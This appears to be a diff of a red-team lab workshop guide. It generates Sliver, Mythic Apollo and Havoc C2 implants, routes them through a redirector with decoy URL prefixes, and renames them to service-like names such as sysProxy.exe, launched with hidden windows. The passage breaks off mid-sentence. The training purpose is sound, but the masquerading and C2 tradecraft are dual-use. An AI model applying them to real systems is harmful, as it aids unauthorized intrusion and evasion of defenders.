@@ -79,27 +79,29 @@ If it fails: "profile with name 'redstack' already exists" is expected on reconn
 ### Step A3. Generate the implant
 
 ```text
-generate --http https://<REDIR_PUBLIC_IP>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/sliverTest.exe
+generate --http https://<REDIR_PUBLIC_IP>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/sysProxy.exe
 ```
 
 The `/cloud/storage/objects/` prefix is what the redirector matches, strips, and forwards to the Sliver HTTPS listener on 443. Wrong prefix = decoy. Cross-compile takes ~60 to 90 seconds.
 
-Success: `[*] Implant saved to /tmp/sliverTest.exe`.
+This is the only Sliver implant you build all workshop. It stays at `/tmp/sysProxy.exe` on the Sliver host and ATTACK reuses it against ShadowGate, so there is no regenerate step later. The name is deliberately service-like, first letter maps to the C2 (s = Sliver).
+
+Success: `[*] Implant saved to /tmp/sysProxy.exe`.
 
 If it fails: SSH hang during generate points at an undersized instance (see Step A1). If it compiles but is owned by root and cannot be pulled, the umask override is missing (`/etc/systemd/system/sliver.service.d/umask.conf`).
 
 ### Step A4. Transfer to Windows and execute
 
-In MobaXterm, `cd /tmp` in the Sliver SSH session; the SFTP panel follows the directory. Right-click `sliverTest.exe` > Download to `C:\Users\Administrator\Desktop\`. Or from PowerShell on the Windows host:
+In MobaXterm, `cd /tmp` in the Sliver SSH session; the SFTP panel follows the directory. Right-click `sysProxy.exe` > Download to `C:\Users\Administrator\Desktop\`. Or from PowerShell on the Windows host:
 
 ```powershell
-scp admin@sliver:/tmp/sliverTest.exe C:\Users\Administrator\Desktop\sliverTest.exe
+scp admin@sliver:/tmp/sysProxy.exe C:\Users\Administrator\Desktop\sysProxy.exe
 ```
 
 Authenticate with `<LAB_PASSWORD>`. Then launch it:
 
 ```powershell
-Start-Process -FilePath "C:\Users\Administrator\Desktop\sliverTest.exe" -WindowStyle Hidden
+Start-Process -FilePath "C:\Users\Administrator\Desktop\sysProxy.exe" -WindowStyle Hidden
 ```
 
 Success: within ~10 seconds Sliver prints an incoming session notification.
@@ -136,13 +138,31 @@ sudo ./mythic-cli status
 
 Success: `apollo` and `http` both show `running` under Installed Services.
 
-If it fails: install and restart:
+If either shows `Created` (installed but not started) or is missing, install and start each, one command at a time (do not lump them, and do not chain `stop && start`):
 
 ```bash
 sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
-sudo ./mythic-cli install github https://github.com/MythicAgents/apollo
-sudo ./mythic-cli stop && sleep 10 && sudo ./mythic-cli start
 ```
+
+```bash
+sudo ./mythic-cli install github https://github.com/MythicAgents/apollo
+```
+
+```bash
+sudo ./mythic-cli restart
+```
+
+If `status` still shows either as `Created` rather than `running`, start the two services explicitly (this is the usual fix for the post-install `Created` state):
+
+```bash
+sudo ./mythic-cli start apollo http
+```
+
+```bash
+sudo ./mythic-cli status
+```
+
+Portal note: on a cold boot the web UI can take ~3 minutes beyond the containers coming up. nginx crash-loops on a missing self-signed cert until `mythic_server` writes it, then serves normally. Red `cannot load certificate` lines in `mythic-cli logs mythic_nginx` during that window are expected. Browse to the portal only after the login page returns, not during the crash-loop.
 
 ### Step B2. Log in and confirm the HTTP profile
 
@@ -171,7 +191,7 @@ Left sidebar > Create Payload:
    | `headers`                  | + Custom, KEY `X-Request-ID`, VALUE `<TOKEN>`  |
    | `encrypted_exchange_check` | leave enabled                                  |
 
-5. Build: Next, name it `apolloTest.exe`, Create Payload.
+5. Build: Next, name it `msDiag.exe` (service-like, m = Mythic), Create Payload.
 
 Success: Payload successfully built popup with a Download link. Save to `C:\Users\Administrator\Downloads\`.
 
@@ -182,7 +202,7 @@ If it fails: if the build hangs > 3 minutes, `sudo ./mythic-cli logs apollo`.
 The payload is already on the Windows host (the UI runs there). From PowerShell:
 
 ```powershell
-Start-Process -FilePath "C:\Users\Administrator\Downloads\apolloTest.exe" -WindowStyle Hidden
+Start-Process -FilePath "C:\Users\Administrator\Downloads\msDiag.exe" -WindowStyle Hidden
 ```
 
 In the Mythic UI, open Active Callbacks (phone icon). A `windows` / Administrator row appears within ~10 seconds. Open its tasking pane and run `ps` to confirm.
@@ -275,11 +295,14 @@ If it fails: silent failure is almost always empty Spawn fields.
 
 ### Step C5. Transfer, execute, confirm, leave running
 
-From PowerShell on the Windows host:
+Havoc always writes the demon as `demon.x64.exe`; rename it to the service-like name on transfer (h = Havoc) so it matches the ATTACK reuse. From PowerShell on the Windows host, one command at a time:
 
 ```powershell
-scp admin@havoc:/home/admin/Desktop/demon.x64.exe C:\Users\Administrator\Desktop\
-Start-Process -FilePath "C:\Users\Administrator\Desktop\demon.x64.exe" -WindowStyle Hidden
+scp admin@havoc:/home/admin/Desktop/demon.x64.exe C:\Users\Administrator\Desktop\hlpUpdate.exe
+```
+
+```powershell
+Start-Process -FilePath "C:\Users\Administrator\Desktop\hlpUpdate.exe" -WindowStyle Hidden
 ```
 
 A session appears in the Havoc Sessions tab within ~10 seconds. Right-click > Interact:
@@ -305,16 +328,4 @@ sudo /home/admin/test_redirector.sh
 
 All three entries under "Testing direct backend connectivity" should show `OK`.
 
-Leave all three beacons running. They are your heartbeats: if the redirector, a listener, or VPC peering breaks during the workshop, the affected beacon goes quiet first. Watch live C2 traffic on the redirector to spot a dead beacon:
-
-```bash
-sudo tail -f /var/log/apache2/redirector-ssl-access.log
-```
-
-All three beacons hit 443, so they all land in `redirector-ssl-access.log`. You should see periodic GET/POST at each beacon's callback interval, prefixed by C2: `/cloud/storage/objects/` (Sliver), `/cdn/media/stream/` (Mythic), `/edge/cache/assets/` (Havoc). A prefix that stops appearing is your early warning.
-
----
-
-## Where this hands off
-
-Three validated callback paths, three live heartbeats on the Windows operator, redirector confirmed. ATTACK uses the Sliver path to land a beacon on ShadowGate and escalate; the Mythic and Havoc heartbeats stay up as config health checks throughout.
+Leave all three beacons running. They are your heartbeats: if the redirector, a listener, or VPC peering breaks during the workshop, the af
